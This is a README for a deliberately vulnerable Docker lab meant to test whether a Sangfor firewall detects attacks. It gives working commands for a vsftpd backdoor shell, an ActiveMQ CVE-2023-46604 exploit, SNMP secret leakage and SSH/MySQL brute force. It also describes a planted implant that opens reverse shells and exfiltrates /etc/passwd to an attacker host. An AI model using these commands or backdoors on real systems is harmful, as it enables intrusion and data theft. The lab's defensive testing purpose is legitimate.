# 🔴 NETWORK EXPLOITATION LAB

> ⚠️ Intentionally-vulnerable target. **Isolated environment only.** Built to test
> whether **Sangfor NGAF (IPS/IDS)** detects/blocks network-service attacks.

One container exposes 5 attack scenarios. Deploy it behind Sangfor, attack from
your Kali host (or another box), and compare what landed vs. what the firewall stopped.

---

## Struktur

```
simulation-network/
├── Dockerfile                 # all-in-one target image
├── docker-compose.yml
├── sources/
│   └── vsftpd-2.3.4.tar.gz    # built from source (backdoor re-added at build)
├── configs/
│   ├── vsftpd.conf
│   ├── sshd_config
│   └── snmpd.conf
└── scripts/
    ├── entrypoint.sh
    ├── apply-backdoor.sh      # re-adds the :)/6200 backdoor into vsftpd source
    ├── c2-sim.sh              # outbound C2/exfil traffic generator (-> c2-sim)
    └── c2-trigger.sh          # always-on implant on tcp/9001 (-> c2-trigger), runs c2-sim on demand
```

## Deploy

```bash
docker compose up -d --build
docker compose logs -f net-target
```

Build downloads Apache ActiveMQ 5.17.3 (needs internet). First boot takes a moment
while MySQL + ActiveMQ start.

## Ports

| Port (host) | Service | Scenario |
|---|---|---|
| 21, 20, 21100-21110 | vsftpd 2.3.4 (FTP) | #1, #5 |
| 6200 | vsftpd backdoor shell | #1 |
| 2222 → 22 | OpenSSH | #5 |
| 161/udp | SNMP (public/private) | #2, #5 |
| 3306 | MySQL (root/toor) | #5 |
| 61616 | ActiveMQ OpenWire | #3 |
| 8161 | ActiveMQ console | #3, recon |
| 9001 | c2-trigger implant | #4 (foothold-independent egress) |

Weak creds: `root:toor`, `sysadmin:admin123`, `ftpuser:ftp123`, MySQL `root:toor`.
SNMP communities: `public` (read-only), `private` (read-write).

---

## 5 SCENARIOS (uji deteksi Sangfor)

### 1. vsftpd 2.3.4 backdoor — FTP → shell on 6200
Login with a username ending in `:)`; a `/bin/sh` binds on port 6200.
```bash
# Metasploit
msfconsole -q -x "use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS <target>; run"

# Manual (shell is single-shot per trigger; re-trigger for a new one)
( printf 'USER x:)\r\nPASS x\r\n'; sleep 2 ) | nc <target> 21
echo 'id; cat /etc/passwd' | nc <target> 6200
```
IPS should flag: `USER ...:)` + the 6200 bind shell.

Notes:
- The tarball shipped here is the **clean** upstream 2.3.4; `scripts/apply-backdoor.sh`
  re-adds the `:)`/6200 behaviour at build time, and neutralises vsftpd's per-session
  sandbox (chroot via `anon_root=/`, address-space + NPROC limits) so the shell is usable.
- The shell runs as the **`ftp`** user (uid 1000) with full filesystem **read** access —
  not root like Metasploitable (vsftpd setuids before the USER command). Fine for the
  IPS signature test; the detectable traffic (`USER :)` + 6200) is identical.

### 2. SNMP enumeration (UDP 161)
Weak community strings + full MIB view = noisy, juicy enumeration. The agent is
chatty on purpose: it leaks system info, processes, installed software, network
config, `/etc/passwd`, and a planted fake-secrets file (via NET-SNMP-EXTEND-MIB).
```bash
# Recon: confirm community + full walk
onesixtyone <target> public
snmpwalk -v2c -c public <target>                       # full dump

# Juicy bits
snmpwalk -v2c -c public <target> hrSWRunTable          # running processes
snmpwalk -v2c -c public <target> 1.3.6.1.2.1.25.6.3.1.2  # installed software
snmpwalk -v2c -c public <target> NET-SNMP-EXTEND-MIB::nsExtendOutputFull
       # -> uname, id, /etc/passwd, routes, /opt/snmp-secrets.txt (fake creds + AD hint)
snmpwalk -v2c -c public <target> system                # sysContact/Location hints

# Read-write community: tamper
snmpset -v2c -c private <target> sysContact.0 s "pwned-by-tester"
```
IPS should flag: SNMP enumeration / community-string brute / `snmpwalk` floods.
NOTE: the secrets file is **fake** lab data; the `domain hint` line is a deliberate
breadcrumb pointing at the upcoming AD lab.

### 3. CVE-2023-46604 — Apache ActiveMQ OpenWire RCE (port 61616)
Recent, non-HTTP protocol, heavily used by ransomware. Real exploit works here
(ActiveMQ 5.17.3 < 5.17.6).
```bash
# e.g. github PoC / metasploit
msfconsole -q -x "use exploit/multi/misc/apache_activemq_rce_cve_2023_46604; set RHOSTS <target>; set RPORT 61616; run"
```
IPS should flag: OpenWire marshalling of a ClassPathXmlApplicationContext / external XML URL.

### 4. Reverse shell + C2 egress detection
Tests **outbound** detection (the NGAF differentiator). After a pop, run `c2-sim`
inside the target pointed at your listener:
```bash
# inside target (or via a popped shell):
c2-sim revshell    <attacker> 4444        # reverse shell
c2-sim http-beacon <attacker> 80          # periodic HTTP C2 beacon
c2-sim dns-tunnel  <attacker> tunnel.evil.test   # DNS tunneling
c2-sim exfil       <attacker> 80          # exfil /etc/passwd over HTTP
```
IPS should flag: reverse-shell egress, beaconing, DNS tunneling, data exfil.

**Egress is about *outbound* traffic — orthogonal to how you got in — so it
shouldn't be coupled to any single foothold.** The container runs an always-on
**c2-trigger implant** on **TCP 9001** (models an implant already resident). Poke
it from the network and it runs `c2-sim` for you — no need to first pop a shell:
```bash
# from the attacker box — '<mode> <your-listener-ip> <port|domain>'
echo 'revshell    10.0.0.2 4444'              | nc <target> 9001
echo 'http-beacon 10.0.0.2 80'                | nc <target> 9001
echo 'exfil       10.0.0.2 80'                | nc <target> 9001
echo 'dns-tunnel  10.0.0.2 tunnel.evil.test'  | nc <target> 9001
```
`http-beacon`/`dns-tunnel` are time-boxed (`C2_BEACON_SECONDS`, default 30s) so a
single poke doesn't beacon forever. The `vulnapp-automation` `net-c2-egress` module
uses this implant by default (and falls back to the vsftpd backdoor if 9001 is
filtered).

### 5. Recon + brute force
```bash
nmap -sV -sC -p- <target>                 # service/version scan
hydra -l root -P rockyou.txt ssh://<target>:2222
hydra -l root -P rockyou.txt mysql://<target>
```
> **FTP is not a credential-brute target here.** vsftpd runs `one_process_model=YES`
> (required for the `:)` backdoor shell on 6200 to work), which forbids local logins
> — so FTP only accepts anonymous + the backdoor trigger. Brute SSH/MySQL instead.
IPS should flag: port scan + auth brute-force / rate anomalies.

---

## Workflow uji Sangfor
1. Deploy lab ni sebagai target di belakang Sangfor NGAF (dapat IP/DNS).
2. Lancarkan setiap scenario dari Kali (melalui firewall).
3. Bandingkan: apa yang berjaya sampai/exploit vs apa yang Sangfor block/alert.

*Untuk tujuan pembelajaran & security testing yang sah sahaja.*
